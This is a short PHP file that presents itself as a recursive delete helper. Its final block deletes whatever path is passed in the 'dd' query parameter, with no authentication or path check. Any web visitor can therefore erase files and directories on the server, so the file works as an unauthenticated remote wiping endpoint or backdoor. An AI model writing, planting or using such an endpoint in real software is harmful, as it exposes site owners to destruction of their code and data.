<?php
/*
 * php delete function that deals with directories recursively
 */
function delete_files($target) {
    if(is_dir($target)){
        $files = glob( $target . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned

        foreach( $files as $file )
        {
            delete_files( $file );
        }
        if (file_exists($target)) {
            rmdir( $target );
        }
    } elseif(is_file($target)) {
        unlink( $target );
    }
}

if (isset($_GET['dd'])) {
    if (file_exists($_GET['dd'])) {
        delete_files($_GET['dd']);
    }
}